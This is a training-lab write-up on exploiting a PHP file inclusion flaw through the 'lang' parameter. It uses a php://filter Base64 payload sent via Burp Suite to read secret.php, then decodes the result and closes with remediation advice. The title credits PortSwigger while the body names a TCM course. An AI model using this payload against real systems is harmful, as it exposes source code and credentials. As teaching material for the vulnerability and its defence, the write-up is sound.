# PHP Wrappers in File Inclusion Vulnerabilities (PortSwigger Lab)

## File Inclusion Vulnerabilities - Lab Analysis

### **Lab: PHP Wrappers in File Inclusion Vulnerabilities**

#### **Lab URL : This is a lab specific to the TCM training from their course Practical Web Hacking**

This lab is a guided exercise from Lab Files.

Additional reference: [PayloadsAllTheThings - PHP Wrappers](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-phpfilter)

GitHub Repository: [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

***

### **Objective**

The goal of this lab is to understand how PHP wrappers can be exploited in **File Inclusion vulnerabilities** to extract sensitive data. By leveraging PHP’s built-in filters, attackers can bypass restrictions and retrieve hidden files encoded in formats such as Base64.

***

### **Understanding the Vulnerability**

* The web application allows dynamic inclusion of files using the `lang` parameter but lacks proper input validation.
* This flaw enables attackers to leverage **PHP wrappers**, such as `php://filter`, to manipulate how the application processes and retrieves files.
* By encoding files in Base64 before returning them in the response, attackers can bypass certain filters and extract sensitive information.

***

### **Step-by-Step Solution**

#### **Step 1: Generate Traffic**

* Navigate to the application running on `localhost`.
* Interact with the language selection feature to observe how files are retrieved.
*   Identify a GET request similar to:

    ```plaintext
    GET /?lang=language/en.php HTTP/1.1
    Host: localhost
    ```
* The `lang` parameter dynamically includes language files.

***

#### **Step 2: Modify the Request with PHP Wrappers**

* Open **Burp Suite** and enable **Intercept** mode.
*   Capture the request and replace the `lang` parameter with a **PHP wrapper payload**:

    ```plaintext
    GET /?lang=php://filter/convert.base64-encode/resource=secret.php HTTP/1.1
    Host: localhost
    ```
* Forward the modified request to the server.

***

#### **Step 3: Decode the Extracted Data**

*   If successful, the server will return a Base64-encoded version of `secret.php`, such as:

    ```plaintext
    PD9waHAgZWNobyAiU2VjcmV0IFBhc3N3b3JkOiBzdXBlclNlY3JldCI7ID8+
    ```
*   Decode the Base64 data using one of the following methods:

    **Using CyberChef:**

    * Paste the encoded string into **CyberChef**.
    * Apply the `From Base64` recipe to reveal the original contents.

    **Using a Terminal:**

    ```bash
    echo 'PD9waHAgZWNobyAiU2VjcmV0IFBhc3N3b3JkOiBzdXBlclNlY3JldCI7ID8+' | base64 -d
    ```
* The output reveals the sensitive contents of `secret.php`, such as hardcoded credentials or API keys.

***

### **Why This is an Example of File Inclusion Vulnerability**

#### **Characteristics of the Vulnerability**

1. **Lack of Input Validation**: The application allows dynamic file inclusion without restricting input.
2. **Use of PHP Wrappers**: Attackers can manipulate the file processing mechanism to bypass security controls.
3. **Exfiltration via Encoding**: Using `php://filter`, attackers encode sensitive files before retrieval to avoid detection.

#### **Security Implications**

* **Information Disclosure**: Exposing source code can lead to credential leaks and further exploitation.
* **Potential Remote Code Execution**: If the attacker gains knowledge of writable file paths, they could inject and execute malicious PHP code.

***

### **Remediation Strategies**

1. **Sanitize User Input**
   * Restrict file paths to pre-approved values.
   * Implement an allowlist approach instead of a blocklist.
2. **Disable PHP Wrappers**
   * If wrappers are not needed, disable them in the PHP configuration to prevent abuse.
   * Use server-side controls to block file inclusion via `php://` streams.
3. **Restrict File Access**
   * Configure the application to only allow file access within designated directories.
   * Use **open\_basedir** in PHP to prevent directory traversal attacks.
4. **Monitor and Log Suspicious Activity**
   * Track file inclusion attempts and log unexpected parameters.
   * Set up alerting mechanisms for unusual file retrieval patterns.

***

### **Conclusion**

This lab illustrates how **PHP wrappers** can be abused in **File Inclusion vulnerabilities** to extract sensitive data. Proper validation of file inclusion paths, disabling unnecessary PHP features, and enforcing strict access controls are key to mitigating these risks. Regular security assessments can help detect and patch such vulnerabilities before they are exploited.
